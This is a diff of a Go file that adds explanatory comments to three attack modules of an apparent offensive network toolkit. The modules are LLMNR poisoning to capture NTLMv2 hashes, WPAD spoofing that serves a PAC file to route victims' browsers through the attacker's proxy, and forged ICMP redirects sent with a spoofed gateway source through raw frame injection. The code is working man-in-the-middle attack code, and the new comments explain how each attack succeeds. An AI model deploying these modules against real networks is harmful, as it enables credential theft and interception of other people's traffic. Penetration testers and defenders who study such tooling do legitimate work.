@@ -16,6 +16,7 @@ import (
 	"github.com/qyvora/toha3ee/internal/safety"
 )
 
+// init registers the LLMNR, WPAD and ICMP-redirect poisoning modules.
 func init() {
 	attacks.Register(&LLMNRSpoof{})
 	attacks.Register(&WPADSpoof{})
@@ -25,13 +26,15 @@ func init() {
 // LLMNRSpoof answers LLMNR name-resolution failures, claiming every name.
 type LLMNRSpoof struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*LLMNRSpoof) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "llmnr.poison",
-		Category:    "mitm",
-		Risk:        attacks.RiskMedium,
-		Targets:     []string{"host"},
+		ID:       "llmnr.poison",
+		Category: "mitm",
+		Risk:     attacks.RiskMedium,
+		Targets:  []string{"host"},
+		// No Requires entry: LLMNR listens on the non-privileged UDP port 5355,
+		// so neither root nor a raw socket is needed to run the responder.
 		Description: "answer LLMNR (port 5355) resolution failures with this host's address to capture NTLMv2 hashes",
 		Limitations: "only triggered when victims' DNS lookups fail; Windows clients retry NetBIOS if this is answered inconsistently",
 	}
@@ -41,6 +44,8 @@ func (*LLMNRSpoof) Meta() attacks.ModuleMeta {
 func (*LLMNRSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
 	rep := &attacks.PreflightReport{}
 	rep.AddOK("bind", "UDP 5355 is a non-privileged port")
+	// A default gateway suggests a routed network where the poisoned traffic
+	// triggered by LLMNR failures will actually pass through this host.
 	if gw, err := ctx.Iface.Gateway(); err == nil && gw != nil {
 		rep.AddOK("iface", ctx.Iface.String())
 	} else {
@@ -83,6 +88,7 @@ func (*LLMNRSpoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
 	}
 	r := v.(*llmnr.Responder)
 	imp := &attacks.Impact{
+		// Poisoned counts queries we answered; Queries is the raw total heard.
 		Summary: fmt.Sprintf("poisoned %d LLMNR queries (%d total)", r.Poisoned.Load(), r.Queries.Load()),
 	}
 	imp.Add("poisoned", fmt.Sprintf("%d", r.Poisoned.Load()))
@@ -103,7 +109,7 @@ func (*LLMNRSpoof) Cleanup(ctx *attacks.AttackCtx) error {
 // WPADSpoof serves a PAC file that forces victims' browsers to use our proxy.
 type WPADSpoof struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*WPADSpoof) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
 		ID:          "wpad.poison",
@@ -115,10 +121,12 @@ func (*WPADSpoof) Meta() attacks.ModuleMeta {
 	}
 }
 
+// wpadState is the per-run state for the WPAD PAC HTTP server, kept so Verify
+// and Cleanup can reach the listener and the Serve goroutine's exit signal.
 type wpadState struct {
-	srv *http.Server
-	ln  net.Listener
-	n   chan error
+	srv *http.Server // HTTP server serving /wpad.dat
+	ln  net.Listener // bound TCP listener on :80
+	n   chan error   // receives the result of srv.Serve so Run can detect exits
 }
 
 // Preflight warns about dependencies.
@@ -131,6 +139,9 @@ func (*WPADSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, e
 
 // Run serves the PAC file and blocks.
 func (m *WPADSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
+	// The PAC script tells the browser to send everything through
+	// this host:proxy_port except localhost and this host itself, so our own
+	// traffic stays direct and does not loop back into the proxy.
 	proxyPort := ctx.Conf.GetDefault("wpad.poison", "proxy_port", "3128")
 	pac := fmt.Sprintf(`function FindProxyForURL(url, host) {
   if (host == "localhost" || host == "%s") return "DIRECT";
@@ -140,12 +151,15 @@ func (m *WPADSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 
 	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		if r.URL.Path == "/wpad.dat" {
+			// The WPAD spec mandates this exact content-type; no-cache forces
+			// browsers to re-fetch so PAC updates take effect quickly.
 			w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
 			w.Header().Set("Cache-Control", "no-cache")
 			fmt.Fprint(w, pac)
 			ctx.Emit(events.TopicLog, fmt.Sprintf("wpad.poison: served PAC to %s", r.RemoteAddr), nil)
 			return
 		}
+		// Anything else hitting this port gets a plain 404.
 		http.NotFound(w, r)
 	})
 
@@ -154,6 +168,8 @@ func (m *WPADSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	if err != nil {
 		return fmt.Errorf("wpad.poison: %w", err)
 	}
+	// Serve in a goroutine and push its result down a buffered channel so Run
+	// can observe an unexpected server exit without blocking the handler.
 	done := make(chan error, 1)
 	go func() { done <- srv.Serve(ln) }()
 
@@ -174,6 +190,8 @@ func (m *WPADSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 		case <-ctx.Done:
 			return nil
 		case err := <-done:
+			// A clean close during shutdown reports http.ErrServerClosed and is
+			// not an error; anything else means the listener died on its own.
 			if err != nil && err != http.ErrServerClosed {
 				return fmt.Errorf("wpad.poison: %w", err)
 			}
@@ -210,13 +228,15 @@ func (*WPADSpoof) Cleanup(ctx *attacks.AttackCtx) error {
 // target subnets through this host.
 type ICMPRedirect struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*ICMPRedirect) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "icmp.redirect",
-		Category:    "mitm",
-		Risk:        attacks.RiskMedium,
-		Targets:     []string{"host"},
+		ID:       "icmp.redirect",
+		Category: "mitm",
+		Risk:     attacks.RiskMedium,
+		Targets:  []string{"host"},
+		// Forging the redirect and spoofing the gateway source requires raw
+		// L2 frame injection.
 		Requires:    []string{"cap.raw_socket"},
 		Description: "forge ICMP redirects telling victims to route target subnets through this host",
 		Limitations: "modern OSes ignore ICMP redirects on unauthenticated hosts and for on-link subnets",
@@ -246,6 +266,9 @@ func (m *ICMPRedirect) Run(ctx *attacks.AttackCtx, opts map[string]string) error
 	if err != nil {
 		return fmt.Errorf("icmp.redirect: %w", err)
 	}
+	// OpenLive gives a raw pcap handle we can use to inject fully crafted
+	// Ethernet frames; promiscuous mode is requested but only matters for
+	// capture, not for sending.
 	handle, err := pcap.OpenLive(ctx.Iface.Name, 65535, true, 500*time.Millisecond)
 	if err != nil {
 		return fmt.Errorf("icmp.redirect: %w", err)
@@ -262,6 +285,8 @@ func (m *ICMPRedirect) Run(ctx *attacks.AttackCtx, opts map[string]string) error
 	ctx.Heartbeat = hb.Beat
 	ctx.Safety.RegisterHeartbeat("icmp.redirect", hb)
 	ctx.SetState("icmp.redirect", &icmpState{handle: handle, sent: new(int64)})
+	// The pcap handle is closed by defer; the cleanup hook is a no-op marker
+	// so the safety layer knows the module's teardown was registered.
 	ctx.Safety.RegisterCleanup("icmp.redirect", "stop ICMP redirect flood", func() error { return nil })
 
 	ctx.Printf("[*] icmp.redirect: redirecting %d victim(s) to route via %s.\n", len(victims), ctx.Iface.IP)
@@ -270,6 +295,8 @@ func (m *ICMPRedirect) Run(ctx *attacks.AttackCtx, opts map[string]string) error
 		case <-ctx.Done:
 			return nil
 		case <-time.After(interval):
+			// For every victim x target combination, forge a redirect; each
+			// successful injection bumps the counter stored in ctx state.
 			for _, v := range victims {
 				for _, target := range optsTargets(ctx, opts) {
 					if err := sendRedirect(handle, ctx.Iface.MAC, gw, v.IP, v.MAC, target, ctx.Iface.IP); err == nil {
@@ -284,11 +311,15 @@ func (m *ICMPRedirect) Run(ctx *attacks.AttackCtx, opts map[string]string) error
 	}
 }
 
+// icmpState is the per-run state kept for Verify and Cleanup.
 type icmpState struct {
-	handle *pcap.Handle
-	sent   *int64
+	handle *pcap.Handle // raw pcap handle used for frame injection
+	sent   *int64       // packet counter shared with Verify
 }
 
+// optsTargets chooses the subnet(s) to redirect: an explicit "targets" run
+// option wins, otherwise the interface's default gateway is the target so
+// victims re-route their internet-bound traffic through us.
 func optsTargets(ctx *attacks.AttackCtx, opts map[string]string) []net.IP {
 	if t := opts["targets"]; t != "" {
 		if ips, err := attacks.ExpandTargets(ctx, t, false); err == nil {
@@ -304,6 +335,9 @@ func optsTargets(ctx *attacks.AttackCtx, opts map[string]string) []net.IP {
 
 // sendRedirect crafts and injects a single ICMP redirect packet at L2.
 func sendRedirect(handle *pcap.Handle, attackerMAC net.HardwareAddr, gw, victim net.IP, vmac net.HardwareAddr, target, newGateway net.IP) error {
+	// Without a known victim MAC, broadcast the frame so the victim's NIC
+	// still receives it (switches flood frames to unknown broadcast
+	// destinations).
 	if vmac == nil {
 		vmac = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
 	}
@@ -315,11 +349,17 @@ func sendRedirect(handle *pcap.Handle, attackerMAC net.HardwareAddr, gw, victim 
 	// field followed by the original datagram's IP header + 8 bytes. gopacket
 	// serializes the gateway field into Id/Seq.
 	icmp := &layers.ICMPv4{
+		// Type 5 code 1 = "redirect datagram for the host" (we redirect only
+		// the victim's traffic to one specific host, not a whole subnet).
 		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeRedirect, 1),
-		Id:       uint16(gw4[0])<<8 | uint16(gw4[1]),
-		Seq:      uint16(gw4[2])<<8 | uint16(gw4[3]),
+		// The 32-bit gateway IP is split across the 16-bit Id and Seq fields
+		// to fit gopacket's ICMPv4 layout.
+		Id:  uint16(gw4[0])<<8 | uint16(gw4[1]),
+		Seq: uint16(gw4[2])<<8 | uint16(gw4[3]),
 	}
-	// Echoed original header: the "packet that triggered the redirect".
+	// Echoed original header: the "packet that triggered the redirect". The
+	// victim only honors the redirect if it quotes an in-flight packet to the
+	// target; we synthesize one from the victim's perspective.
 	echo := &layers.IPv4{
 		Version:  4,
 		TTL:      64,
@@ -330,6 +370,8 @@ func sendRedirect(handle *pcap.Handle, attackerMAC net.HardwareAddr, gw, victim 
 
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
+	// The outer IP header is spoofed with the gateway as source so the victim
+	// believes its real router sent the redirect.
 	ip := &layers.IPv4{
 		Version:  4,
 		TTL:      64,
@@ -337,11 +379,15 @@ func sendRedirect(handle *pcap.Handle, attackerMAC net.HardwareAddr, gw, victim 
 		SrcIP:    gw,
 		DstIP:    victim,
 	}
+	// Ethernet frame: our MAC as source, the victim's MAC (or broadcast) as
+	// destination.
 	eth := &layers.Ethernet{
 		SrcMAC:       attackerMAC,
 		DstMAC:       vmac,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
+	// The trailing 8 zero bytes complete the quoted original datagram's
+	// payload (IP header + 8 bytes minimum per RFC 792).
 	if err := gopacket.SerializeLayers(buf, opts, eth, ip, icmp, echo, gopacket.Payload(make([]byte, 8))); err != nil {
 		return err
 	}
@@ -367,6 +413,8 @@ func (*ICMPRedirect) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// Compile-time assertions that all three modules in this file implement
+// attacks.Module.
 var (
 	_ attacks.Module = (*LLMNRSpoof)(nil)
 	_ attacks.Module = (*WPADSpoof)(nil)
